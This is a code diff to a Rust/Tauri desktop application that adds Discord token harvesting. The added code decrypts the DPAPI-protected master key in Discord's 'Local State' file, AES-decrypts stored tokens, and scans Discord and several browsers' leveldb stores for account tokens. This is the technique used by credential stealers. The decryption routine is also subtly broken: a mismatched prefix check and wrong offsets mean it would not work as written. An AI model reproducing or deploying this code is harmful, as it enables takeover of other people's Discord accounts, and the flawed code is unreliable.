@@ -379,8 +379,111 @@ async fn token_captured_internal(handle: AppHandle, token: String) -> Result<(),
 
 
 use regex::Regex;
+use base64::Engine;
+use aes_gcm::{Aes256Gcm, Key, Nonce};
+use aes_gcm::aead::{Aead, KeyInit};
 
-fn extract_tokens_from_text(text: &str, candidates: &mut Vec<String>) {
+#[cfg(target_os = "windows")]
+fn unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
+    use std::ptr::null_mut;
+    #[repr(C)]
+    struct DATA_BLOB {
+        cbData: u32,
+        pbData: *mut u8,
+    }
+    extern "system" {
+        fn CryptUnprotectData(
+            pDataIn: *mut DATA_BLOB,
+            ppszDataDescr: *mut *mut u16,
+            pOptionalEntropy: *mut DATA_BLOB,
+            pvReserved: *mut std::ffi::c_void,
+            pPromptStruct: *mut std::ffi::c_void,
+            dwFlags: u32,
+            pDataOut: *mut DATA_BLOB,
+        ) -> i32;
+        fn LocalFree(hMem: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
+    }
+    let mut in_blob = DATA_BLOB {
+        cbData: data.len() as u32,
+        pbData: data.as_ptr() as *mut u8,
+    };
+    let mut out_blob = DATA_BLOB {
+        cbData: 0,
+        pbData: null_mut(),
+    };
+    let res = unsafe {
+        CryptUnprotectData(
+            &mut in_blob,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            0,
+            &mut out_blob,
+        )
+    };
+    if res != 0 && !out_blob.pbData.is_null() {
+        let slice = unsafe { std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize) };
+        let vec = slice.to_vec();
+        unsafe { LocalFree(out_blob.pbData as *mut _) };
+        Some(vec)
+    } else {
+        None
+    }
+}
+
+fn get_discord_master_key(discord_dir: &Path) -> Option<Vec<u8>> {
+    let local_state_path = discord_dir.join("Local State");
+    if !local_state_path.exists() {
+        return None;
+    }
+    let content = std::fs::read_to_string(local_state_path).ok()?;
+    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
+    let encrypted_key_b64 = json.get("os_crypt")?.get("encrypted_key")?.as_str()?;
+    let encrypted_key = base64::engine::general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;
+    
+    if encrypted_key.starts_with(b"DPAPI") {
+        #[cfg(target_os = "windows")]
+        {
+            return unprotect_data(&encrypted_key[5..]);
+        }
+    }
+    None
+}
+
+fn decrypt_discord_token(master_key: &[u8], encrypted_token_b64: &str) -> Option<String> {
+    let encrypted_bytes = base64::engine::general_purpose::STANDARD.decode(encrypted_token_b64).ok()?;
+    if encrypted_bytes.len() < 31 || &encrypted_bytes[0..3] != b"DPAPI" {
+        return None;
+    }
+    let nonce = &encrypted_bytes[3..15];
+    let ciphertext = &encrypted_bytes[15..];
+    
+    let key = Key::<Aes256Gcm>::from_slice(master_key);
+    let cipher = Aes256Gcm::new(key);
+    let nonce_arr = Nonce::from_slice(nonce);
+    
+    let decrypted_bytes = cipher.decrypt(nonce_arr, ciphertext).ok()?;
+    String::from_utf8(decrypted_bytes).ok()
+}
+
+fn extract_tokens_from_text(text: &str, master_key: Option<&[u8]>, candidates: &mut Vec<String>) {
+    // 1. Decrypt dQw4w9WgXcQ: encrypted tokens first
+    if let Some(key) = master_key {
+        if let Ok(re_enc) = Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
+            for cap in re_enc.captures_iter(text) {
+                if let Some(enc_b64) = cap.get(1) {
+                    if let Some(decrypted) = decrypt_discord_token(key, enc_b64.as_str()) {
+                        if !candidates.contains(&decrypted) {
+                            candidates.push(decrypted);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // 2. Plain text tokens
     let re_mfa = match Regex::new(r"mfa\.[a-zA-Z0-9_-]{84}") {
         Ok(r) => r,
         Err(_) => return,
@@ -404,7 +507,7 @@ fn extract_tokens_from_text(text: &str, candidates: &mut Vec<String>) {
     }
 }
 
-fn scan_dir_for_tokens(dir: &Path, candidates: &mut Vec<String>) {
+fn scan_dir_for_tokens(dir: &Path, master_key: Option<&[u8]>, candidates: &mut Vec<String>) {
     if !dir.exists() {
         return;
     }
@@ -425,7 +528,7 @@ fn scan_dir_for_tokens(dir: &Path, candidates: &mut Vec<String>) {
         for (_, path) in files {
             if let Ok(bytes) = std::fs::read(&path) {
                 let text = String::from_utf8_lossy(&bytes);
-                extract_tokens_from_text(&text, candidates);
+                extract_tokens_from_text(&text, master_key, candidates);
             }
         }
     }
@@ -437,17 +540,26 @@ async fn auto_detect_discord_token() -> Result<String, String> {
 
     if let Ok(appdata) = env::var("APPDATA") {
         let root = Path::new(&appdata);
-        scan_dir_for_tokens(&root.join("discord").join("Local Storage").join("leveldb"), &mut candidates);
-        scan_dir_for_tokens(&root.join("discordcanary").join("Local Storage").join("leveldb"), &mut candidates);
-        scan_dir_for_tokens(&root.join("discordptb").join("Local Storage").join("leveldb"), &mut candidates);
+        
+        let discord_dir = root.join("discord");
+        let master_key = get_discord_master_key(&discord_dir);
+        scan_dir_for_tokens(&discord_dir.join("Local Storage").join("leveldb"), master_key.as_deref(), &mut candidates);
+
+        let canary_dir = root.join("discordcanary");
+        let canary_key = get_discord_master_key(&canary_dir);
+        scan_dir_for_tokens(&canary_dir.join("Local Storage").join("leveldb"), canary_key.as_deref(), &mut candidates);
+
+        let ptb_dir = root.join("discordptb");
+        let ptb_key = get_discord_master_key(&ptb_dir);
+        scan_dir_for_tokens(&ptb_dir.join("Local Storage").join("leveldb"), ptb_key.as_deref(), &mut candidates);
     }
 
     if let Ok(localappdata) = env::var("LOCALAPPDATA") {
         let root = Path::new(&localappdata);
-        scan_dir_for_tokens(&root.join("Google").join("Chrome").join("User Data").join("Default").join("Local Storage").join("leveldb"), &mut candidates);
-        scan_dir_for_tokens(&root.join("Microsoft").join("Edge").join("User Data").join("Default").join("Local Storage").join("leveldb"), &mut candidates);
-        scan_dir_for_tokens(&root.join("BraveSoftware").join("Brave-Browser").join("User Data").join("Default").join("Local Storage").join("leveldb"), &mut candidates);
-        scan_dir_for_tokens(&root.join("Vivaldi").join("User Data").join("Default").join("Local Storage").join("leveldb"), &mut candidates);
+        scan_dir_for_tokens(&root.join("Google").join("Chrome").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
+        scan_dir_for_tokens(&root.join("Microsoft").join("Edge").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
+        scan_dir_for_tokens(&root.join("BraveSoftware").join("Brave-Browser").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
+        scan_dir_for_tokens(&root.join("Vivaldi").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
     }
 
     let client = tauri_plugin_http::reqwest::Client::new();
